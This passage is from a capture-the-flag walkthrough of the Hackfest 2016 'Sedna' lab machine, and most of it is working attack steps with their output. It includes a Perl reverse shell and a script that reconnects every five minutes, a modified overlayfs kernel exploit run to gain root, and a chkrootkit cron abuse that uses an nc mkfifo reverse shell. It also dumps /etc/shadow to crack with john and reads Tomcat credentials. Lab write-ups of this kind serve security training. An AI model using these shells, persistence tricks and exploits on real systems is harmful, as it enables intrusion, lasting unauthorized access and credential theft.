+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>perl -e 'use Socket;$i="10.183.0.222";$p=5433;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</div>
+</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Maintaining Access</h2>
+</div>
+<div><br /></div>
+<div>Since SSH is open on the victim, I checked to see if the www-data user has a default home directory and shell defined.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>grep `whoami` /etc/passwd</div>
+    <div>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</div>
+</div>
+<div><br /></div>
+<div>The home directory exists, but only allows writes by root.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>drwxr-xr-x  3 root root   4096 Oct 22  2016 www</div>
+</div>
+<div><br /></div>
+<div>The default shell is set to '/usr/sbin/nologin', so I won't be able to SSH to the box with this account.</div>
+<div><br /></div>
+<div>I decided to create a simple shell script that will try to connect back to my attacking machine every 5 minutes.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/hackfest2016/sedna# cat loading</div>
+    <div>#!/bin/sh</div>
+    <div>while true; do</div>
+    <div>    perl -e 'use Socket;$i="10.183.0.222";$p=5433;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</div>
+    <div>    # sleep for 300 seconds (5 mins)</div>
+    <div>    sleep 300</div>
+    <div>done</div>
+</div>
+<div><br /></div>
+<div>I uploaded the script to the victim's /var/www/html/files directory and ran it in the background. Now, if I get disconnected, I should be able to restart a listener and get back in within 5 minutes.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>www-data@Sedna:/var/www/html/files$ wget -O loading 10.183.0.222:4321/loading</div>
+    <div>wget -O loading 10.183.0.222:4321/loading</div>
+    <div>--2019-04-16 10:28:00--  http://10.183.0.222:4321/loading</div>
+    <div>Connecting to 10.183.0.222:4321... connected.</div>
+    <div>HTTP request sent, awaiting response... 200 OK</div>
+    <div>Length: 311 [application/octet-stream]</div>
+    <div>Saving to: 'loading'</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>100%[======================================&gt;] 311         --.-K/s   in 0s      </div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>2019-04-16 10:28:00 (76.0 MB/s) - 'loading' saved [311/311]</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>www-data@Sedna:/var/www/html/files$ chmod +x loading</div>
+    <div>chmod +x loading</div>
+    <div>www-data@Sedna:/var/www/html/files$ ./loading &amp;</div>
+    <div>./loading &amp;</div>
+    <div>[1] 23635</div>
+</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Privilege Escalation</h2>
+</div>
+<div><br /></div>
+<div>The /etc/issue.net file shows the operating system to be Ubuntu 14.04.1 LTS. The /boot directory shows a kernel version of 3.13.0-32 (confirmed with uname -r). This was also confirmed in the /etc/os-release file.</div>
+<div><br /></div>
+<div>Searching the exploit database, a couple of exploits have potential.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation         | exploits/linux/local/37292.c</div>
+    <div>Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation (Access | exploits/linux/local/37293.txt</div>
+</div>
+<div><br /></div>
+<div>I started a python web service and transferred the 37292.c file to the victim.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/hackfest2016/sedna# python -m SimpleHTTPServer 4321</div>
+    <div>Serving HTTP on 0.0.0.0 port 4321 ...</div>
+    <div>10.183.0.185 - - [15/Apr/2019 16:27:14] "GET /37292.c HTTP/1.1" 200 -</div>
+</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>www-data@Sedna:/tmp$ wget -O 37292.c 10.183.0.222:4321/37292.c</div>
+    <div>wget -O 37292.c 10.183.0.222:4321/37292.c</div>
+    <div>--2019-04-15 16:27:15--  http://10.183.0.222:4321/37292.c</div>
+    <div>Connecting to 10.183.0.222:4321... connected.</div>
+    <div>HTTP request sent, awaiting response... 200 OK</div>
+    <div>Length: 5119 (5.0K) [text/plain]</div>
+    <div>Saving to: '37292.c' </div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>100%[======================================&gt;] 5,119       --.-K/s   in 0s</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>2019-04-15 16:27:15 (726 MB/s) - '37292.c' saved [5119/5119]</div>
+</div>
+<div><br /></div>
+<div>The file successfully compiled and seemed to run properly, but it didn't give me root. Turns out, the 'su' command (the last command in the exploit) is not available on the victim.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>www-data@Sedna:/tmp$ gcc -o pwn 37292.c</div>
+    <div>www-data@Sedna:/tmp$ ./pwn</div>
+    <div>spawning threads</div>
+    <div>mount #1</div>
+    <div>mount #2</div>
+    <div>child threads done   </div>
+    <div>/etc/ld.so.preload created</div>
+    <div>creating shared library</div>
+    <div>
+        <div><br /></div>
+        <div>www-data@Sedna:/tmp$ su -</div>
+        <div>The program 'su' is currently not installed. To run 'su' please ask your administrator to install the package 'login'</div>
+    </div>
+</div>
+<div><br /></div>
+<div>I opened the exploit C code and replaced references to 'su' with 'sudo' (which <span style="font-style: italic;">is</span> available and is also suid).</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/hackfest2016/sedna# diff 37292.c 37292-1.c </div>
+    <div>54c54</div>
+    <div>&lt; #define LIB "#include &lt;unistd.h&gt;\n\nuid_t(*_real_getuid) (void);\nchar path[128];\n\nuid_t\ngetuid(void)\n{\n_real_getuid = (uid_t(*)(void)) dlsym((void *) -1, \"getuid\");\nreadlink(\"/proc/self/exe\", (char *) &amp;path, 128);\nif(geteuid() == 0 &amp;&amp; !strcmp(path, \"/bin/su\")) {\nunlink(\"/etc/ld.so.preload\");unlink(\"/tmp/ofs-lib.so\");\nsetresuid(0, 0, 0);\nsetresgid(0, 0, 0);\nexecle(\"/bin/sh\", \"sh\", \"-i\", NULL, NULL);\n}\n    return _real_getuid();\n}\n"</div>
+    <div>---</div>
+    <div>&gt; #define LIB "#include &lt;unistd.h&gt;\n\nuid_t(*_real_getuid) (void);\nchar path[128];\n\nuid_t\ngetuid(void)\n{\n_real_getuid = (uid_t(*)(void)) dlsym((void *) -1, \"getuid\");\nreadlink(\"/proc/self/exe\", (char *) &amp;path, 128);\nif(geteuid() == 0 &amp;&amp; !strcmp(path, \"/usr/bin/sudo\")) {\nunlink(\"/etc/ld.so.preload\");unlink(\"/tmp/ofs-lib.so\");\nsetresuid(0, 0, 0);\nsetresgid(0, 0, 0);\nexecle(\"/bin/sh\", \"sh\", \"-i\", NULL, NULL);\n}\n    return _real_getuid();\n}\n"</div>
+    <div>151,152c151,152</div>
+    <div>&lt;     execl("/bin/su","su",NULL);</div>
+    <div>&lt; }</div>
+    <div>\ No newline at end of file</div>
+    <div>---</div>
+    <div>&gt;     execl("/usr/bin/sudo","sudo",NULL);</div>
+    <div>&gt; }</div>
+</div>
+<div><br /></div>
+<div>I transferred the updated exploit to the victim and recompiled. This time, it worked! :]</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>www-data@Sedna:/tmp$ gcc -o pwn2 37292-1.c</div>
+    <div>www-data@Sedna:/tmp$ ./pwn2</div>
+    <div>spawning threads</div>
+    <div>mount #1</div>
+    <div>mount #2</div>
+    <div>child threads done</div>
+    <div>/etc/ld.so.preload created</div>
+    <div>creating shared library</div>
+    <div># id</div>
+    <div>uid=0(root) gid=0(root) groups=0(root),33(www-data)</div>
+</div>
+<div><br /></div>
+<div>And the flag from /root...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@Sedna:/root# cat flag.txt</div>
+    <div>a10828bee17db751de4b936614558305</div>
+</div>
+<div><br /></div>
+<div>
+    <h2>Pivoting</h2>
+</div>
+<div>N/A</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Clean Up</h2>
+</div>
+<div><br /></div>
+<div>*** REMOVE PUBLIC KEY FROM /root/.ssh/authorized_keys ***</div>
+<div>*** REMOVE /var/www/html/files/rev.php ***</div>
+<div>*** KILL /var/www/html/files/loading ***</div>
+<div>*** REMOVE /var/www/html/files/loading ***</div>
+<div>*** REMOVE update, ofs-lib.so, pwn, 37292.c, pwn2, and 37292-1.c from /tmp ***</div>
+<div><br /></div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Additional Info</h2>
+</div>
+<div><br /></div>
+<div><span style="font-weight: bold;">chkrootkit</span></div>
+<div><br /></div>
+<div>In addition to the privilege escalation issue we found in Ubuntu, there is a known issue with the version of 'chkrootkit' located in /etc/chkrootkit.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>www-data@Sedna:/etc/chkrootkit$ ./chkrootkit -V</div>
+    <div>chkrootkit version 0.49</div>
+</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>Chkrootkit 0.49 - Local Privilege Escalation                                                                 | exploits/linux/local/33899.txt</div>
+</div>
+<div><br /></div>
+<div>The write-up in the Exploit Database states that chkrootkit has to be run by root to launch the exploit (typically through a cron job). Let's see if chkrootkit is set up to run in cron...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>www-data@Sedna:/etc$ grep -ri 'chkrootkit' cron*</div>
+    <div>www-data@Sedna:/etc$</div>
+</div>
+<div><br /></div>
+<div>Nothing. 😞 It is possible a cronjob is set up in root's crontab, but we can't know for sure. Doesn't hurt to try it...</div>
+<div><br /></div>
+<div>Started my reverse shell listener in Metasploit.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>msf5 &gt; use exploit/multi/handler</div>
+    <div>msf5 exploit(multi/handler) &gt; set payload generic/shell_reverse_tcp</div>
+    <div>payload =&gt; generic/shell_reverse_tcp</div>
+    <div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div>
+    <div>LHOST =&gt; 10.183.0.222</div>
+    <div>msf5 exploit(multi/handler) &gt; set LPORT 5434</div>
+    <div>LPORT =&gt; 5434</div>
+    <div>msf5 exploit(multi/handler) &gt; run -j</div>
+    <div>[*] Exploit running as background job 7.</div>
+    <div>[*] Exploit completed, but no session was created.</div>
+    <div>[*] Started reverse TCP handler on 10.183.0.222:5434 </div>
+</div>
+<div><br /></div>
+<div>Created 'update' file with the following.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/hackfest2016/sedna# cat update</div>
+    <div>#!/bin/sh</div>
+    <div>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.183.0.222 5434 &gt;/tmp/f</div>
+</div>
+<div><br /></div>
+<div>Transferred the update file to /tmp on the victim using python SimpleHTTPServer and wget.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>www-data@Sedna:/tmp$ wget -O update 10.183.0.222:4321/update</div>
+    <div>wget -O update 10.183.0.222:4321/update</div>
+    <div>--2019-04-15 19:48:34--  http://10.183.0.222:4321/update</div>
+    <div>Connecting to 10.183.0.222:4321... connected.</div>
+    <div>HTTP request sent, awaiting response... 200 OK</div>
+    <div>Length: 90 [application/octet-stream]</div>
+    <div>Saving to: 'update'</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>100%[======================================&gt;] 90          --.-K/s   in 0s      </div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>2019-04-15 19:48:34 (23.8 MB/s) - 'update' saved [90/90]</div>
+</div>
+<div><br /></div>
+<div>IMPORTANT: We need to set our 'update' file as executable to get it to run when chkrootkit does, obviously.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>www-data@Sedna:/tmp$ chmod +x update</div>
+</div>
+<div><br /></div>
+<div>Now we wait... but not for long...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>www-data@Sedna:/tmp$ [*] Command shell session 7 opened (10.183.0.222:5434 -&gt; 10.183.0.185:40341) at 2019-04-15 19:55:02 -0400</div>
+    <div><br /></div>
+    <div>www-data@Sedna:/tmp$ sessions 7</div>
+    <div><br /></div>
+    <div>
+        <div>[*] Backgrounding session 3...</div>
+    </div>
+    <div>[*] Starting interaction with 7...</div>
+    <div>
+        <div><br /></div>
+        <div># id</div>
+    </div>
+    <div>uid=0(root) gid=0(root) groups=0(root)</div>
+</div>
+<div><br /></div>
+<div>Turns out root did have 'chkrootkit' set up to run in his crontab every 5 minutes. :] I guess if you are going to run a vulnerable piece of software, you should at least run it often.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div># crontab -l</div>
+    <div># Edit this file to introduce tasks to be run by cron.</div>
+    <div># </div>
+    <div># Each task to run has to be defined through a single line</div>
+    <div># indicating with different fields when the task will be run</div>
+    <div># and what command to run for the task</div>
+    <div># </div>
+    <div># To define the time you can provide concrete values for</div>
+    <div># minute (m), hour (h), day of month (dom), month (mon),</div>
+    <div># and day of week (dow) or use '*' in these fields (for 'any').# </div>
+    <div># Notice that tasks will be started based on the cron's system</div>
+    <div># daemon's notion of time and timezones.</div>
+    <div># </div>
+    <div># Output of the crontab jobs (including errors) is sent through</div>
+    <div># email to the user the crontab file belongs to (unless redirected).</div>
+    <div># </div>
+    <div># For example, you can run a backup of all your user accounts</div>
+    <div># at 5 a.m every week with:</div>
+    <div># 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/</div>
+    <div># </div>
+    <div># For more information see the manual pages of crontab(5) and cron(8)</div>
+    <div># </div>
+    <div># m h  dom mon dow   command</div>
+    <div>*/5 * * * * /root/chkrootkit/chkrootkit</div>
+</div>
+<div><br /></div>
+<div><br /></div>
+<div><span style="font-weight: bold;">crackmeforpoints</span></div>
+<div><br /></div>
+<div>Found an additional "flag" in the /etc/passwd file...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@Sedna:~# cat /etc/passwd</div>
+    <div>[...]</div>
+    <div>crackmeforpoints:x:1000:1000::/home/crackmeforpoints:</div>
+    <div><span style="font-size: 12px; font-family: Monaco;">[...]</span></div>
+</div>
+<div><br /></div>
+<div>The hash for the account is...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@Sedna:~# cat /etc/shadow</div>
+    <div><span style="font-size: 12px; font-family: Monaco;">[...]</span></div>
+    <div>crackmeforpoints:$6$p22wX4fD$RRAamkeGIA56pj4MpM7CbrKPhShVkZnNH2NjZ8JMUP6Y/1upG.54kSph/HSP1LFcn4.2C11cF0R7QmojBqNy5/:17104:0:99999:7:::</div>
+    <div>[...]</div>
+</div>
+<div><br /></div>
+<div>I copied the passwd and shadow files to my attacking machine using scp and ran unshadow. I also ran john with a big dictionary, but was not able to crack the password. ¯\_(ツ)_/¯</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/hackfest2016/sedna# scp -i sedna root@10.183.0.185:/etc/passwd .</div>
+    <div>passwd                                                                                                              100% 1962   587.1KB/s   00:00</div>
+    <div>root@kali:~/Walkthroughs/hackfest2016/sedna# scp -i sedna root@10.183.0.185:/etc/shadow .</div>
+    <div>shadow                                                                                                              100% 1235   401.1KB/s   00:00</div>
+    <div>root@kali:~/Walkthroughs/hackfest2016/sedna# unshadow ./passwd ./shadow &gt; crackme</div>
+</div>
+<div><br /></div>
+<div><br /></div>
+<div><span style="font-weight: bold;">tomcat-users.xml</span></div>
+<div><br /></div>
+<div>Once we had root we were able to browse through protected configuration files in /etc including the tomcat-users.xml file in /etc/tomcat7. The credentials in this file could be used on the Tomcat service listening on TCP port 8080.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@Sedna:/etc/tomcat7# cat tomcat-users.xml </div>
+    <div>&lt;?xml version='1.0' encoding='utf-8'?&gt;</div>
+    <div>&lt;!--</div>
+    <div>  Licensed to the Apache Software Foundation (ASF) under one or more</div>
+    <div>  contributor license agreements.  See the NOTICE file distributed with</div>
+    <div>  this work for additional information regarding copyright ownership.</div>
+    <div>  The ASF licenses this file to You under the Apache License, Version 2.0</div>
+    <div>  (the "License"); you may not use this file except in compliance with</div>
+    <div>  the License.  You may obtain a copy of the License at</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>      http://www.apache.org/licenses/LICENSE-2.0</div>
+    <div>
+        <div><br /></div>
+        <div><br /></div>
+    </div>
+    <div>  Unless required by applicable law or agreed to in writing, software</div>
+    <div>  distributed under the License is distributed on an "AS IS" BASIS,</div>
+    <div>  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</div>
+    <div>  See the License for the specific language governing permissions and</div>
+    <div>  limitations under the License.</div>
+    <div>--&gt;</div>
+    <div>&lt;tomcat-users&gt;</div>
+    <div>&lt;!--</div>
+    <div>  NOTE:  By default, no user is included in the "manager-gui" role required</div>
+    <div>  to operate the "/manager/html" web application.  If you wish to use this app,</div>
+    <div>  you must define such a user - the username and password are arbitrary.</div>
+    <div>--&gt;</div>
+    <div>&lt;!--</div>
+    <div>  NOTE:  The sample user and role entries below are wrapped in a comment</div>
+    <div>  and thus are ignored when reading this file. Do not forget to remove</div>
+    <div>  &lt;!.. ..&gt; that surrounds them.</div>
+    <div>--&gt;</div>
+    <div>
+        <div>&lt;!--</div>
+        <div>  &lt;role rolename="tomcat"/&gt;</div>
+        <div>  &lt;role rolename="role1"/&gt;</div>
+        <div>  &lt;user username="tomcat" password="tomcat" roles="tomcat"/&gt;</div>
+        <div>  &lt;user username="both" password="tomcat" roles="tomcat,role1"/&gt;</div>
+        <div>  &lt;user username="role1" password="tomcat" roles="role1"/&gt;</div>
+        <div>--&gt;</div>
+        <div>&lt;role rolename="manager-gui"/&gt;</div>
+        <div>&lt;user username="tomcat" password="submitthisforpoints" roles="manager-gui"/&gt;</div>
+        <div>&lt;/tomcat-users&gt;</div>
+    </div>
+</div>
+<div><br /></div>
+<div><br /></div>
+<div><br /></div>
